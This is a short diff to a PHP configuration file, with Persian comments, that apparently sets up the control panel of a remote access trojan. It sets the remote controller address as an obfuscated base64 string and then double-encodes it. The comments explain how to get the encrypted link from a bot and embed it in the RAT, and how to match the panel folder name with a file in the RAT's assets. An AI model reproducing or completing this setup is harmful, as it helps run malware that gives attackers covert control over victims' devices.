@@ -1,5 +1,5 @@
 <?php
-$site = "aHR0cHM6Ly9kZXYtcGFkc2FnLnBhbnRoZW9uc2l0ZS5pby8="; //آدرس ریموتت بدون پوشه (پورت) مثال : https://madsal.com/
+$site = "YUhSMGNITTZMeTlrWlhZdGNHRmtjMkZuTG5CaGJuUm9aVzl1YzJsMFpTNXBieTg9"; //آدرس ریموتت بدون پوشه (پورت) مثال : https://madsal.com/
 //دوست عزیز این لینک باید بصورت انکریپت توی رت قرار بگیره پس اول پنل رو ران کن و دستور /Madsal رو واسه ربات بفرست تا لینک انکریپت رو بهت بده
 //➖➖➖➖➖➖➖➖➖➖➖
 $sudo_port = "jojo"; //این پورتته دیفالتش همینه و اسم پوشت هم باید همین باشه ولی اگه خواستی عوض کنی توی رت assets/sudoport.txt رو هم همون بزار.
